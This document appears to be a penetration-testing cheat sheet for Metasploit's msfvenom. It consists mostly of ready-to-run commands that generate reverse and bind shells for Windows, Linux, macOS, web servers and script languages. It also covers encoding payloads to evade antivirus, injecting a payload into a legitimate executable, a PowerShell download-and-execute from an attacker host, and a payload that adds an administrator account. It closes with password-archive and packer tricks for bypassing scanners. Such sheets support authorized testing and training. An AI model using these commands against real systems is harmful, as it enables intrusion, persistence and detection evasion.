# Index
- [[Metasploit]]
	- [[Metasploit Multi Handler]]
	- [[Meterpreter]]
	- [[Msfvenom]]
	- [[Searchsploit]]

# Msfvenom

Msfvenom is a part of the Metasploit Framework and is used to generate malicious payloads and encode them to evade detection. It combines the capabilities of the previously separate `msfpayload` and `msfencode` into a single tool, making it easier to generate and encode payloads in a single command.

## Basic Syntax
```bash
msfvenom [options] -p <payload> LHOST=<attack_ip> LPORT=<attack_port> -f <format> -o <output_file>
```

## Core Options
- `-h`: Help
- `-p`: Specifies the payload to use.
- `-l (list type)`: List module type i.e. payloads, encoders
	- `-l payloads`
	- `-l encoders`
	- `-l formats`
- `-f`: Format for the output file (e.g., exe, elf, raw, etc.).
- `-e`: Encoder to use for encoding the payload.
- `-o <filename>`: Specifies the output file to save the payload.
- `-a`: Specifies the architecture (x86, x64, etc.).
- `-s (space)`: Define maximum payload capacity
- `-b <characters>`: Bad characters to avoid.
- `--platform`: Specifies the target platform (Windows, Linux, etc.).
- `-x <filename>`: Inject the payload into an existing executable.
- `-i <number>`: Number of encoding iterations.
- `-k`: Keep the original functionality of the file when using the `-x` option (injecting into executables).
- `-n`: NOP sled length to use in payload.
- `LHOST`: Local host (attacker's IP address).
- `LPORT`: Local port (attacker's port).

## Payload Options

1. **Payload Structure:**
	```bash
	<type>/<os>/<payload_name>
	```
2. **List Payloads:**
	```bash
	msfvenom -l payloads
	```
3. **Staged (payload path contains `/`):**
	```bash
	windows/x64/meterpreter/reverse_tcp
	```
4. **Stageless (payload path contains `_`):**
	```bash
	windows/x64/meterpreter_reverse_tcp
	```

#### Reverse Shell Payloads
Reverse shell payloads connect back to the attacker when executed, making them ideal for situations where firewalls block inbound connections but allow outbound connections.

1. **Windows Reverse Shell (TCP):** Generates a reverse TCP shell payload for Windows.
	```bash
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f exe -o shell.exe
	```
2. **Linux Reverse Shell (TCP):** Creates a reverse TCP shell for Linux systems in ELF format.
	```bash
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f elf -o shell.elf
	```

#### Bind Shell Payloads
Bind shell payloads create a listener on the target machine and wait for the attacker to connect to it.

1. **Windows Bind Shell (TCP):**
	```bash
	msfvenom -p windows/shell_bind_tcp LHOST=<target_ip> LPORT=<target_port> -f exe -o bind_shell.exe
	```
2. **Linux Bind Shell (TCP):**
	```bash
	msfvenom -p linux/x86/shell_bind_tcp LHOST=<target_ip> LPORT=<target_port> -f elf -o bind_shell.elf
	```

### Staged vs. Stageless Payloads
1. **Staged Payload:** A smaller payload that fetches the rest of the malicious code after execution.
	```bash
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f exe -o staged_payload.exe
	```
2. **Stageless Payload:** The entire payload is delivered in one go, avoiding the need for multiple network connections.
	```bash
	msfvenom -p windows/meterpreter_reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f exe -o stageless_payload.exe
	```

## Format Options

1. **List Format:**
	```bash
	msfvenom -l format
	```

#### Executable File Formats
1. **Windows EXE**
	```bash
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f exe -o shell.exe
	```
2. **Linux ELF**
	```bash
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f elf -o shell.elf
	```

#### Web Payloads
1. **PHP**
	```bash
	msfvenom -p php/meterpreter_reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f raw > shell.php
	```
2. **ASP**
	```bash
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f asp > shell.asp
	```
3. **JSP**
	```bash
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f raw > shell.jsp
	```

#### Scripting Payloads
1. **Python**
	```bash
	msfvenom -p python/meterpreter_reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f raw > shell.py
	```
2. **Perl**
	```bash
	msfvenom -p cmd/unix/reverse_perl LHOST=<attack_ip> LPORT=<attack_port> -f raw > shell.pl
	```
3. **Bash**
	```bash
	msfvenom -p cmd/unix/reverse_bash LHOST=<attack_ip> LPORT=<attack_port> -f raw > shell.sh
	```

#### Windows Scripting Payloads
1. **PowerShell**
	```bash
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f psh > shell.ps1
	```
2. **VBScript**
	```bash
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f vbs > shell.vbs
	```
3. **HTA (HTML Application)**
	```bash
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f hta-psh > shell.hta
	```

## Encoding Options
Encoding payloads helps to evade detection by antivirus and intrusion detection systems. Msfvenom supports various encoders.

1. **Encoder Structure:**
	```bash
	<architecture>/<encoder_name>
	```
2. **List Encoders:**
	```bash
	msfvenom -l encoders
	```
3. **Single Encoding:** Encoding is useful for evading signature-based detection mechanisms.
	```bash
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -e x86/shikata_ga_nai -f exe -o shell_encoded.exe
	```
4. **Multiple Encoding Iterations:** You can encode the payload multiple times to further obfuscate it.
	```bash
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -e x86/shikata_ga_nai -i 10 -f exe -o shell_multi_encoded.exe
	```
5. **Custom Bad Characters:** Exclude certain characters that could break the payload (e.g., null bytes).
	```bash
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -b '\x00\xff' -f exe -o shell_no_badchars.exe
	```

## Injections into Existing Binaries

1. **Injecting a Payload into an Executable:** This allows you to embed a malicious payload into a legitimate file.
	```bash
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -x <existing_file.exe> -k -f exe -o injected_shell.exe
	```

## Customizing Payloads
Msfvenom allows for various customizations such as setting specific platform and architecture types.

1. **Targeting Specific Platforms:**
	```bash
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> --platform windows -f exe -o shell.exe
	```
2. **Specifying the Target Architecture:**
	```bash
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -a x86 -f elf -o shell_x86.elf
	```
3. **Multi-Platform Payloads:**
	```bash
	msfvenom -p multi/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f python -o multi_platform_payload.py
	```

## Creating NOP Sleds
NOP sleds are useful in certain buffer overflow attacks.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -n 16 -f exe -o shell_with_nops.exe
```

# Payload Examples

#### Windows

1. **Reverse Shell:**
	```bash
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f exe > reverse.exe
	```
2. **Bind Shell:**
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=<target_ip> LPORT=<target_port> -f exe > bind.exe
```
3. **Create User:**
	```bash
	msfvenom -p windows/adduser USER=<username> PASS=<password> -f exe > adduser.exe
	```
4. **CMD Shell:**
	```bash
	msfvenom -p windows/shell/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f exe > prompt.exe
	```
5. **Execute Command:**
	```bash
	msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://<attack_ip>/nishang.ps1')\"" -f exe > pay.exe
	```

	```bash
	msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
	```
6. **Embedded Inside an Executable:**
	```bash
	msfvenom -p windows/shell_reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
	```

#### Linux Payloads
1. **Reverse Shell:**
	```bash
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f elf > reverse.elf
	```

	```bash
	msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f elf > shell.elf
	```
2. **Bind Shell:**
	```bash
	msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<target_ip> LPORT=<attack_port> -f elf > bind.elf
	```
3. **SunOS (Solaris):**
	```bash
	msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
	```

#### MAC Payloads
1. **Reverse Shell:**
	```bash
	msfvenom -p osx/x86/shell_reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f macho > reverse.macho
	```
2. **Bind Shell:**
	```bash
	msfvenom -p osx/x86/shell_bind_tcp RHOST=<target_ip> LPORT=<attack_port> -f macho > bind.macho
	```

#### Web Based Payloads
1. **PHP Reverse shell:**
	```bash
	msfvenom -p php/meterpreter_reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f raw > shell.php
	```

	```bash
	cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
	```
2. **ASP/x Reverse Shell:**
	```bash
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f asp >reverse.asp
	```

	```bash
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f aspx >reverse.aspx
	```
3. **JSP Reverse Shell:**
	```bash
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f raw> reverse.jsp
	```
4. **WAR Reverse Shell:**
	```bash
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f war > reverse.war
	```
5. **NodeJS:**
	```bash
	msfvenom -p nodejs/shell_reverse_tcp LHOST=<attack_ip> LPORT=<attack_port>
	```

#### Script Language payloads
1. **Perl:**
	```bash
	msfvenom -p cmd/unix/reverse_perl LHOST=<attack_ip> LPORT=<attack_port> -f raw > reverse.pl
	```
2. **Python:**
	```bash
	msfvenom -p cmd/unix/reverse_python LHOST=<attack_ip> LPORT=<attack_port> -f raw > reverse.py
	```
3. **Bash:**
	```bash
	msfvenom -p cmd/unix/reverse_bash LHOST=<attack_ip> LPORT=<attack_port> -f raw > shell.sh
	```

# Additional Information

#### Payload Defense Evasion: Archiving
Archiving a piece of information such as a file, folder, script, executable, picture, or document and placing a password on the archive bypasses a lot of common anti-virus signatures today. However, the downside of this process is that they will be raised as notifications in the AV alarm dashboard as being unable to be scanned due to being locked with a password. An administrator can choose to manually inspect these archives to determine if they are malicious or not.

1. **Archiving the Payload:**
	```bash
	wget [https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz](https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz)
	tar -xzvf rarlinux-x64-612.tar.gz && cd rar
	rar a ~/test.rar -p ~/test.js
	Enter password (will not be echoed): ******
	Reenter password: ******
	
	RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
	Trial version             Type 'rar -?' for help
	Evaluation copy. Please register.
	
	Creating archive test.rar
	Adding    test.js                                                     OK
	Done
	```
2. **Archiving the Payload:**
	```bash
	ls
	
	test.js   test.rar
	```
3. **Removing the .RAR Extension:**
	```bash
	mv test.rar test
	ls
	
	test   test.js
	```
4. **Archiving the Payload Again:**
	```bash
	rar a test2.rar -p test
	Enter password (will not be echoed): ******
	Reenter password: ******
	
	RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
	Trial version             Type 'rar -?' for help
	Evaluation copy. Please register.
	
	Creating archive test2.rar
	Adding    test                                                        OK
	Done
	```
5. **Removing the .RAR Extension:**
	```bash
	mv test2.rar test2
	ls
	
	test   test2   test.js
	```
6. **Final Product is `test2`**

####  Payload Defense Evasion: Packers
The term Packer refers to the result of an executable compression process where the payload is packed together with an executable program and with the decompression code in one single file. When run, the decompression code returns the backdoored executable to its original state, allowing for yet another layer of protection against file scanning mechanisms on target hosts. This process takes place transparently for the compressed executable to be run the same way as the original executable while retaining all of the original functionality. In addition, Msfvenom provides the ability to compress and change the file structure of a backdoored executable and encrypt the underlying process structure.

- A list of popular packer software:
	- UPX packer
	- The Enigma Protector
	- MPRESS
	- Alternate EXE Packer
	- ExeStealth
	- Morphine
	- MEW
	- Themida

# Resources

|**Website**|**URL**|
|-|-|
|Msfvenom Official Documentation|https://docs.metasploit.com|
|Exploit Database|https://www.exploit-db.com|
|GTFOBins Msfvenom|https://gtfobins.github.io/gtfobins/msfvenom/|
|Msfvenom Payload Generator|https://www.metasploit.com|
|Metasploit Unleashed|https://www.offensive-security.com/metasploit-unleashed/|
|Encoding Payloads with Msfvenom|https://null-byte.wonderhowto.com/how-to/encode-metasploit-payloads-bypass-antivirus-with-msfvenom-0162972/|
|Writing Custom Payloads|https://www.offensive-security.com/metasploit-unleashed/writing-custom-payloads/|
|Evading Detection with Msfvenom|https://www.fireeye.com/blog/threat-research/2020/01/msfvenom-advanced-payload-encoding-evading-detection.html|
